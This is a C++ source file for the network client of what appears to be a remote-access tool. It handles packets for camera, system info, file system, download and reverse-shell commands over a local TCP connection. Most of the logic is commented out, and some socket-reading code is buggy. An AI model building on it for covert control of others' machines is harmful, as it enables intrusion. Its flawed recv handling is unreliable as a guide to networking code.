#include "NetClientService.h"
#include <WS2tcpip.h>
#include <iostream>
#include "../concurrent/events/net/NetEvent.h"
#include <sstream>
#include "../../../shared/NetLib//packets/Packet.h"
#include "../../../shared/NetLib/packets/PacketPresentation.h"
#include "../../../shared/NetLib/packets/PacketSysInfo.h"
#include "../concurrent/events/net/PacketNetEvent.h"
#include "../../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../../shared/NetLib/packets/PacketDownload.h"
#include "../../../shared/NetLib/packets/PacketShell.h"


NetClientService::NetClientService(NetQueuedThreadChannel* netEventChannel)
	: BaseNetClientService(), netEventChannel(netEventChannel)
{
}


NetClientService::~NetClientService()
{
}

bool NetClientService::ReceivePacket(PacketType packet)
{
	return false;
}


void NetClientService::handlePacket(const Packet* packet)
{
	if (packet == nullptr)
		return;

	switch (packet->getType())
	{
	case PacketType::Camera: //Packet Type: chat message

		break;
	case PacketType::FileSystem:
		{
			/*
			std::string FileName; //string to store file name
			if (!GetString(ID, FileName)) //If issue getting file name
				return false; //Failure to process packetType

			connections[ID]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate);
			//Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
			if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
			{
				std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." <<
					std::endl;
				return true;
			}

			connections[ID]->file.fileName = FileName;
			//set file name just so we can print it out after done transferring
			connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
			connections[ID]->file.infileStream.seekg(0);
			//Set cursor position in file back to offset 0 for when we read file
			connections[ID]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file

			if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
				return false;
			*/
			break;
		}
	default: break;
	}

	// netEventChannel.submitToApp(nullptr);
}


UUID* NetClientService::getUuid()
{
	return clientUuid;
}

DWORD NetClientService::start()
{
	setSocketDescriptor(socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
	DWORD returnCode = 0;
	try
	{
		connectToIpAddress("127.0.0.1", 3002);
		netEventChannel->submitToApp(new NetEvent(NetEventType::ConnectionOpened, "connection established"));
		interact();
	}
	catch (NetError& err)
	{
		std::ostringstream ss;
		ss << err.messageChar;
		ss << " Error Code: " << err.errorCode;

		netEventChannel->submitToApp(new NetEvent(NetEventType::ClientServiceExit, ss.str()));
		returnCode = -1;
	}

	netEventChannel->submitToApp(new NetEvent(NetEventType::ClientServiceExit, "Interact loop finished"));
	return returnCode;
}

void NetClientService::onDisconnected()
{
	netEventChannel->
		submitToApp(new NetEvent(NetEventType::ClientServiceExit, "[-] ReadHeader returned false"));
}

void NetClientService::onPacketReceived(PacketType packetType, char* payloadBuffer, size_t payloadLength)
{
	Packet* packet;
	if (packetType == PacketType::ClientInformation)
		packet = PacketPresentation::deserialize(payloadBuffer,
		                                         payloadLength);
	else if (packetType == PacketType::ClientInformation)
		packet = PacketSysInfo::deserialize(payloadBuffer,
		                                    payloadLength);
	else if (packetType == PacketType::FileSystem)
		packet = PacketFileSystem::deserialize(payloadBuffer, payloadLength);
	else if (packetType == PacketType::Download)
		packet = PacketDownload::deserialize(payloadBuffer, payloadLength);
	else if (packetType == PacketType::ReverseShell)
		packet = PacketShell::deserialize(payloadBuffer, payloadLength);
	else
	{
		// For packets that do not have any payload:
		// - PacketProcess
		packet = new Packet(packetType);
	};
	// handlePacket(packet);
	PacketNetEvent* packetNetEvent = new PacketNetEvent(packet);
	netEventChannel->submitToApp(packetNetEvent);
}


bool NetClientService::HandleSendFile(int ID)
{
	return true;
	/*
	if (connections[ID]->file.fileOffset >= connections[ID]->file.fileSize)
		//If end of file reached then return true and skip sending any bytes
		return true;
	if (!SendPacketType(ID, PacketType::FileTransferByteBuffer)) //Send packet type for file transfer byte buffer
		return false;

	connections[ID]->file.remainingBytes = connections[ID]->file.fileSize - connections[ID]->file.fileOffset;
	//calculate remaining bytes
	if (connections[ID]->file.remainingBytes > connections[ID]->file.buffersize) //if remaining bytes > max byte buffer
	{
		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.buffersize);
		//read in max buffer size bytes
		if (!Sendint32_t(ID, connections[ID]->file.buffersize)) //send int of buffer size
			return false;
		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.buffersize)) //send bytes for buffer
			return false;
		connections[ID]->file.fileOffset += connections[ID]->file.buffersize;
		//increment fileoffset by # of bytes written
	}
	else
	{
		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.remainingBytes);
		//read in remaining bytes
		if (!Sendint32_t(ID, connections[ID]->file.remainingBytes)) //send int of buffer size
			return false;
		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.remainingBytes)) //send bytes for buffer
			return false;
		connections[ID]->file.fileOffset += connections[ID]->file.remainingBytes;
		//increment fileoffset by # of bytes written
	}

	if (connections[ID]->file.fileOffset == connections[ID]->file.fileSize) //If we are at end of file
	{
		if (!SendPacketType(ID, PacketType::FileTransfer_EndOfFile)) //Send end of file packet
			return false;
		//Print out data on server details about file that was sent
		std::cout << std::endl << "File sent: " << connections[ID]->file.fileName << std::endl;
		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
	}
	return true;
	*/
}

/*
 

bool NetClientService::GetPacketType(PacketType& _PacketType)
{
	int packettype;
	if (!readIntAsPacketType(packettype)) //Try to receive PacketType type... If PacketType type fails to be recv'd
		return false; //Return false: PacketType type not successfully received
	_PacketType = (PacketType)packettype;
	return true; //Return true if we were successful in retrieving the PacketType type
}

bool NetClientService::readInt(int32_t& int32)
{
	int numberOfBytes = 0;
	while (numberOfBytes < sizeof int32_t)
		numberOfBytes = recv(connectionSocket, ((char*)&int32) + numberOfBytes, sizeof int32_t, 0);
	return true;
}

bool NetClientService::readIntAsPacketType(int32_t& _int32_t)
{
	if (!readInt(_int32_t)) //Try to receive int... If int fails to be recv'd
		return false; //Return false: Int not successfully received
	_int32_t = ntohl(_int32_t); //Convert long from Network Byte Order to Host Byte Order
	return true; //Return true if we were successful in retrieving the int
}

bool NetClientService::recvall(int ID, char* data, int totalbytes)
{
	int bytesreceived = 0; //Holds the total bytes received
	while (bytesreceived < totalbytes) //While we still have more bytes to recv
	{
		int RetnCheck = recv(connectionSocket, data, totalbytes - bytesreceived, NULL); //Try to recv remaining bytes
		if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to recv bytes
			return false; //Return false - failed to recvall
		bytesreceived += RetnCheck; //Add to total bytes received
	}
	return true; //Success!
}
bool NetClientService::receivePacketStruct(PacketStruct& packetStruct)
{
	int numBytes = 0; // The number of bytes currently recieved

	try
	{
		int packetTypeNetworkOrder;
		// Read 4 bytes for the packet Type
		while (numBytes < sizeof packetTypeNetworkOrder)
		{
			numBytes = recv(connectionSocket, ((char*)&packetTypeNetworkOrder) + numBytes,
			                sizeof packetTypeNetworkOrder, 0);
			if (numBytes == 0 || numBytes == SOCKET_ERROR)
				return false;
		}
		int packetLenNetOrder;
		// TODO: Is right to do char* + 1, it increases 1 or 4 ?
		while (numBytes < sizeof packetLenNetOrder)
		{
			numBytes = recv(connectionSocket, ((char*)&packetLenNetOrder) + numBytes, sizeof packetLenNetOrder, 0);

			if (numBytes == 0 || numBytes == SOCKET_ERROR)
				return false;
		}

		long packetType = ntohl(packetTypeNetworkOrder);
		long packetLength = ntohl(packetLenNetOrder);
		packetStruct.packetType = (PacketType)packetType;
		packetStruct.packetSize = packetLength;
		char* buffer = new char[packetLength];


		while (numBytes < sizeof packetLength)
		{
			numBytes = recv(connectionSocket, buffer + numBytes, sizeof packetLenNetOrder, 0);
			if (numBytes == 0 || numBytes == SOCKET_ERROR)
				return false;
		}

		packetStruct.data = std::string(buffer);

		delete[] buffer;
		return true;
	}
	catch (AppError& excp)
	{
		/*
		if (excp.getErrCode() == WSAECONNRESET)
		{
			//cout   << "!! your party has shut down the connection... \n";
			//winLog << "!! your party has shut down the connection... \n";
			return -1;
		}
		excp.response();
		exit(1);
		*/ /*
	}

	// buffer.append(charMsg);
	return false;
}

void NetClientService::Interact()
{
	PacketType PacketType;
	Packet* packet;
	running = true;
	while (running)
	{
		/*
		if (!GetPacketType(PacketType)) //Get PacketType type
			break; //If there is an issue getting the PacketType type, exit this loop
		if (!ReceivePacket(PacketType)) //Process PacketType (PacketType type)
			break; //If there is an issue processing the PacketType, exit this loop

		*/

// Receive PacketStruct
/*
PacketStruct packetStruct = {};
if (receivePacketStruct(packetStruct))
{
	packet = PacketProcessor::buildPacket(packetStruct);
	handlePacket(packet);
}
else
{
	return;
}
	}

	/*
	connected = false;
	//std::cout << "Lost connection to the server." << std::endl;
	if (clientptr->CloseConnection())
		//Try to close clientSocket connection..., If connection clientSocket was closed properly
	{
		//std::cout << "Socket to the server was closed successfuly." << std::endl;
	}
	else //If connection clientSocket was not closed properly for some reason from our function
	{
		//std::cout << "Socket was not able to be closed." << std::endl;
	}
	int retn = recv(clientSocket, data, totalBytes - bytesReceived, NULL);
	if (retn == SOCKET_ERROR)
		return false;
	Packet packet;
	handlePacket(packet);
	bytesReceived += retn;
	*//*
}
 */
